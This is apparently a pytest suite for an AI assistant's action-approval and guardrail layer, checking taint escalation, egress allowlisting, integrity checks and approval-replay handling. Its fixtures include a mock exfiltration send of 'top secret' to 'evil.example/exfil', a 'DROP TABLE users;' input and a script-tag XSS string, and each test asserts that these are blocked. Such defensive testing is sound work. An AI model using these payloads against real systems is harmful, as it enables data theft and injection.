from __future__ import annotations

import copy
from collections.abc import Generator
from dataclasses import dataclass, field
from typing import Any, cast

from fastapi.testclient import TestClient
import pytest
from sqlalchemy import select
from testcontainers.postgres import PostgresContainer

from ariel.app import ModelAdapter, create_app
from ariel.persistence import ActionAttemptRecord


@dataclass
class ActionProposalAdapter:
    provider: str = "provider.s2-pr02"
    model: str = "model.s2-pr02-v1"
    proposals_by_message: dict[str, list[dict[str, Any]]] = field(default_factory=dict)

    def respond(
        self,
        user_message: str,
        *,
        session_id: str,
        turn_id: str,
        history: list[dict[str, Any]],
        context_bundle: dict[str, Any],
    ) -> dict[str, Any]:
        del session_id, turn_id, history, context_bundle
        proposals = self.proposals_by_message.get(user_message, [])
        return {
            "assistant_text": f"assistant::{user_message}",
            "provider": self.provider,
            "model": self.model,
            "usage": {"prompt_tokens": 17, "completion_tokens": 13, "total_tokens": 30},
            "provider_response_id": "resp_s2_pr02_123",
            "action_proposals": copy.deepcopy(proposals),
        }


@pytest.fixture(scope="session")
def postgres_url() -> Generator[str, None, None]:
    with PostgresContainer("postgres:16-alpine") as postgres:
        url = postgres.get_connection_url()
        yield url.replace("psycopg2", "psycopg")


def _build_client(postgres_url: str, adapter: ModelAdapter) -> TestClient:
    app = create_app(
        database_url=postgres_url,
        model_adapter=adapter,
        reset_database=True,
    )
    return TestClient(app)


def _session_id(client: TestClient) -> str:
    active = client.get("/v1/sessions/active")
    assert active.status_code == 200
    return active.json()["session"]["id"]


def _event_types(turn_payload: dict[str, Any]) -> list[str]:
    return [event["event_type"] for event in turn_payload["events"]]


def test_s2_pr02_tainted_side_effect_is_escalated_to_approval_with_auditable_reason(
    postgres_url: str,
) -> None:
    adapter = ActionProposalAdapter(
        proposals_by_message={
            "tainted draft": [
                {
                    "capability_id": "cap.framework.write_draft",
                    "input": {"note": "draft from untrusted page"},
                    "influenced_by_untrusted_content": True,
                }
            ]
        }
    )
    with _build_client(postgres_url, adapter) as client:
        session_id = _session_id(client)
        sent = client.post(f"/v1/sessions/{session_id}/message", json={"message": "tainted draft"})
        assert sent.status_code == 200
        body = sent.json()

        attempt = body["turn"]["action_attempts"][0]
        assert attempt["status"] == "awaiting_approval"
        assert attempt["policy_decision"] == "requires_approval"
        assert attempt["policy_reason"] == "taint_escalated_requires_approval"

        event_types = _event_types(body["turn"])
        assert "evt.action.execution.started" not in event_types
        proposed_event = next(
            event for event in body["turn"]["events"] if event["event_type"] == "evt.action.proposed"
        )
        assert proposed_event["payload"]["taint"]["influenced_by_untrusted_content"] is True
        policy_event = next(
            event
            for event in body["turn"]["events"]
            if event["event_type"] == "evt.action.policy_decided"
        )
        assert policy_event["payload"]["reason"] == "taint_escalated_requires_approval"


def test_s2_pr02_tainted_external_send_is_denied_with_explicit_reason(
    postgres_url: str,
) -> None:
    adapter = ActionProposalAdapter(
        proposals_by_message={
            "tainted outbound": [
                {
                    "capability_id": "cap.framework.external_notify",
                    "input": {
                        "destination": "https://api.framework.local/notify",
                        "message": "ship it",
                    },
                    "influenced_by_untrusted_content": True,
                }
            ]
        }
    )
    with _build_client(postgres_url, adapter) as client:
        session_id = _session_id(client)
        sent = client.post(f"/v1/sessions/{session_id}/message", json={"message": "tainted outbound"})
        assert sent.status_code == 200
        body = sent.json()

        attempt = body["turn"]["action_attempts"][0]
        assert attempt["status"] == "rejected"
        assert attempt["policy_decision"] == "deny"
        assert attempt["policy_reason"] == "taint_denied_untrusted_side_effect"
        assert "taint_denied_untrusted_side_effect" in body["assistant"]["message"]

        event_types = _event_types(body["turn"])
        assert "evt.action.execution.started" not in event_types
        policy_event = next(
            event
            for event in body["turn"]["events"]
            if event["event_type"] == "evt.action.policy_decided"
        )
        assert policy_event["payload"]["reason"] == "taint_denied_untrusted_side_effect"


def test_s2_pr02_approval_execution_blocks_on_integrity_mismatch_before_invocation(
    postgres_url: str,
) -> None:
    adapter = ActionProposalAdapter(
        proposals_by_message={
            "integrity check": [
                {"capability_id": "cap.framework.write_note", "input": {"note": "pin me"}}
            ]
        }
    )
    with _build_client(postgres_url, adapter) as client:
        session_id = _session_id(client)
        sent = client.post(f"/v1/sessions/{session_id}/message", json={"message": "integrity check"})
        assert sent.status_code == 200
        attempt = sent.json()["turn"]["action_attempts"][0]
        approval_id = attempt["approval"]["id"]
        action_attempt_id = attempt["id"]

        app = cast(Any, client.app)
        with app.state.session_factory() as db:
            with db.begin():
                action_attempt = db.scalar(
                    select(ActionAttemptRecord).where(ActionAttemptRecord.id == action_attempt_id).limit(1)
                )
                assert action_attempt is not None
                action_attempt.capability_version = "999.0"
                if hasattr(action_attempt, "capability_contract_hash"):
                    setattr(action_attempt, "capability_contract_hash", "f" * 64)

        approved = client.post(
            "/v1/approvals",
            json={"approval_id": approval_id, "decision": "approve", "actor_id": "user.local"},
        )
        assert approved.status_code == 200
        approved_body = approved.json()
        assert approved_body["action_attempt"]["status"] == "failed"
        assert "integrity_mismatch" in (approved_body["action_attempt"]["execution"]["error"] or "")
        assert "integrity mismatch" in approved_body["assistant"]["message"].lower()

        timeline = client.get(f"/v1/sessions/{session_id}/events")
        assert timeline.status_code == 200
        latest_turn = timeline.json()["turns"][-1]
        event_types = _event_types(latest_turn)
        assert event_types.index("evt.action.approval.approved") < event_types.index(
            "evt.action.execution.failed"
        )
        assert "evt.action.execution.succeeded" not in event_types


def test_s2_pr02_non_allowlisted_egress_is_blocked_with_user_visible_auditable_reason(
    postgres_url: str,
) -> None:
    adapter = ActionProposalAdapter(
        proposals_by_message={
            "egress deny": [
                {
                    "capability_id": "cap.framework.external_notify",
                    "input": {
                        "destination": "https://evil.example/exfil",
                        "message": "top secret",
                    },
                }
            ]
        }
    )
    with _build_client(postgres_url, adapter) as client:
        session_id = _session_id(client)
        sent = client.post(f"/v1/sessions/{session_id}/message", json={"message": "egress deny"})
        assert sent.status_code == 200
        approval_id = sent.json()["turn"]["action_attempts"][0]["approval"]["id"]

        approved = client.post(
            "/v1/approvals",
            json={"approval_id": approval_id, "decision": "approve", "actor_id": "user.local"},
        )
        assert approved.status_code == 200
        body = approved.json()
        assert body["action_attempt"]["status"] == "failed"
        assert "egress_destination_denied" in (body["action_attempt"]["execution"]["error"] or "")
        assert "egress_destination_denied" in body["assistant"]["message"]

        timeline = client.get(f"/v1/sessions/{session_id}/events")
        assert timeline.status_code == 200
        latest_turn = timeline.json()["turns"][-1]
        failed_event = next(
            event for event in latest_turn["events"] if event["event_type"] == "evt.action.execution.failed"
        )
        assert "egress_destination_denied" in failed_event["payload"]["error"]


def test_s2_pr02_allowlisted_egress_executes_and_does_not_surface_internal_egress_metadata(
    postgres_url: str,
) -> None:
    adapter = ActionProposalAdapter(
        proposals_by_message={
            "egress allow": [
                {
                    "capability_id": "cap.framework.external_notify",
                    "input": {
                        "destination": "https://api.framework.local/notify",
                        "message": "safe payload",
                    },
                }
            ]
        }
    )
    with _build_client(postgres_url, adapter) as client:
        session_id = _session_id(client)
        sent = client.post(f"/v1/sessions/{session_id}/message", json={"message": "egress allow"})
        assert sent.status_code == 200
        approval_id = sent.json()["turn"]["action_attempts"][0]["approval"]["id"]

        approved = client.post(
            "/v1/approvals",
            json={"approval_id": approval_id, "decision": "approve", "actor_id": "user.local"},
        )
        assert approved.status_code == 200
        body = approved.json()
        assert body["action_attempt"]["status"] == "succeeded"
        output = body["action_attempt"]["execution"]["output"]
        assert output is not None
        assert output["status"] == "sent"
        assert output["destination"] == "https://api.framework.local/notify"
        assert "__egress__" not in output


def test_s2_pr02_pre_execution_guardrail_blocks_unsafe_input_before_side_effects(
    postgres_url: str,
) -> None:
    adapter = ActionProposalAdapter(
        proposals_by_message={
            "unsafe write": [
                {
                    "capability_id": "cap.framework.write_note",
                    "input": {"note": "DROP TABLE users;"},
                }
            ]
        }
    )
    with _build_client(postgres_url, adapter) as client:
        session_id = _session_id(client)
        sent = client.post(f"/v1/sessions/{session_id}/message", json={"message": "unsafe write"})
        assert sent.status_code == 200
        approval_id = sent.json()["turn"]["action_attempts"][0]["approval"]["id"]

        approved = client.post(
            "/v1/approvals",
            json={"approval_id": approval_id, "decision": "approve", "actor_id": "user.local"},
        )
        assert approved.status_code == 200
        body = approved.json()
        assert body["action_attempt"]["status"] == "failed"
        assert "guardrail_pre_input_blocked" in (body["action_attempt"]["execution"]["error"] or "")


def test_s2_pr02_post_execution_guardrail_blocks_unsafe_output_before_user_surfacing(
    postgres_url: str,
) -> None:
    adapter = ActionProposalAdapter(
        proposals_by_message={
            "unsafe read": [
                {
                    "capability_id": "cap.framework.read_echo",
                    "input": {"text": "<script>alert('x')</script>"},
                }
            ]
        }
    )
    with _build_client(postgres_url, adapter) as client:
        session_id = _session_id(client)
        sent = client.post(f"/v1/sessions/{session_id}/message", json={"message": "unsafe read"})
        assert sent.status_code == 200
        body = sent.json()
        attempt = body["turn"]["action_attempts"][0]
        assert attempt["status"] == "failed"
        assert "guardrail_post_output_blocked" in (attempt["execution"]["error"] or "")
        assert "<script>" not in body["assistant"]["message"]


def test_s2_pr02_approval_replay_does_not_duplicate_side_effect_execution(
    postgres_url: str,
) -> None:
    adapter = ActionProposalAdapter(
        proposals_by_message={
            "single write": [{"capability_id": "cap.framework.write_note", "input": {"note": "once"}}]
        }
    )
    with _build_client(postgres_url, adapter) as client:
        session_id = _session_id(client)
        sent = client.post(f"/v1/sessions/{session_id}/message", json={"message": "single write"})
        assert sent.status_code == 200
        approval_id = sent.json()["turn"]["action_attempts"][0]["approval"]["id"]

        first = client.post(
            "/v1/approvals",
            json={"approval_id": approval_id, "decision": "approve", "actor_id": "user.local"},
        )
        assert first.status_code == 200
        assert first.json()["action_attempt"]["status"] == "succeeded"

        replay = client.post(
            "/v1/approvals",
            json={"approval_id": approval_id, "decision": "approve", "actor_id": "user.local"},
        )
        assert replay.status_code == 409
        assert replay.json()["error"]["code"] == "E_APPROVAL_NOT_PENDING"

        timeline = client.get(f"/v1/sessions/{session_id}/events")
        assert timeline.status_code == 200
        latest_turn = timeline.json()["turns"][-1]
        assert _event_types(latest_turn).count("evt.action.execution.started") == 1
        assert _event_types(latest_turn).count("evt.action.execution.succeeded") == 1
